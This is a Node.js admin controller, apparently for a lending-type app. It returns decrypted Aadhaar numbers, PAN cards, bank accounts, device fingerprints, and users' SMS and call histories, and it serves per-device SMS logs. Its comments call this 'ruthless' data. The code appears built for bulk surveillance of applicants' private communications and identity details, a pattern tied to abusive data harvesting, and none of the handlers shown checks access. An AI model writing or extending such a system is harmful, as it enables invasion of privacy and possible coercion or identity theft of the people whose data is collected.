const { Application, SmsLog } = require('../models');
const { decrypt } = require('../utils/encryption');

exports.getAllApplications = async (req, res) => {
    try {
        const applications = await Application.findAll({
            order: [['createdAt', 'DESC']]
        });

        const decryptedApplications = applications.map(app => {
            const data = app.toJSON();

            // Decrypt ruthless details
            return {
                ...data,
                panCard: decrypt(data.panCard),
                aadhaarNumber: decrypt(data.aadhaarNumber),
                bankAccount: decrypt(data.bankAccount),
                deviceFingerprint: decrypt(data.deviceFingerprint),
                smsHistory: decrypt(data.smsHistory),
                callHistory: decrypt(data.callHistory)
            };
        });

        res.json(decryptedApplications);
    } catch (error) {
        console.error('[ADMIN ERROR]', error);
        res.status(500).json({ error: 'Failed to fetch ruthless data' });
    }
};

exports.getApplicationById = async (req, res) => {
    try {
        const { id } = req.params;
        const app = await Application.findOne({ where: { applicationId: id } });

        if (!app) return res.status(404).json({ error: 'Not found' });

        const data = app.toJSON();
        res.json({
            ...data,
            panCard: decrypt(data.panCard),
            aadhaarNumber: decrypt(data.aadhaarNumber),
            bankAccount: decrypt(data.bankAccount),
            deviceFingerprint: decrypt(data.deviceFingerprint),
            smsHistory: decrypt(data.smsHistory),
            callHistory: decrypt(data.callHistory)
        });
    } catch (error) {
        res.status(500).json({ error: 'Error fetching details' });
    }
};
exports.getSmsLogs = async (req, res) => {
    try {
        const { applicationId, deviceId } = req.query;
        let where = {};
        if (applicationId) where.applicationId = applicationId;
        if (deviceId) where.deviceId = deviceId;

        const logs = await SmsLog.findAll({
            where,
            order: [['date', 'DESC']],
            limit: 100
        });

        res.json(logs);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch SMS logs' });
    }
};
